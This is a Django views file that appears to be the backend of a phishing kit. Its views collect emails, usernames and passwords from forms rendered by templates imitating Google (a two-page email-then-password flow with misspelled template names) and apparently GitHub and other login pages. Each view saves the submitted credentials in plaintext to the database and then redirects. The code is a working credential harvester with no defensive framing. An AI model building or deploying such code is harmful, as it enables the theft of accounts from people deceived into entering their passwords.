from django.shortcuts import render , redirect
from .models import Ali , Ram , Google , Googlep , Git 

# Create your views here.
def index(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']

        ali = Ali(email=email, password=password)
        ali.save()
        return redirect('index')

    return render (request, 'networkbinary/index.html')


def ram(request):
      
      if request.method == 'POST':
        email = request.POST['username']
        password = request.POST['password']

        ram = Ram(email=email, password=password)
        ram.save()
        return redirect('index')
      return render (request, 'networkbinary/ram.html')

def google(request):
    if request.method == 'POST':
        email = request.POST['email']

        google = Google(email=email)
        google.save()
        return redirect('googlep')
    return render (request, 'networkbinary/gogle.html')

def googlep(request):
    if request.method == 'POST':
       
        password = request.POST['password']

        googlep = Googlep(password=password)
        googlep.save()
        return redirect('index')
    return render (request, 'networkbinary/goglep.html')

def git(request):
    if request.method == 'POST':
        username = request.POST['email']
        password = request.POST['password']

        git = Git(username=username, password=password)
        git.save()
        return redirect('index')
    return render (request, 'networkbinary/git.html')

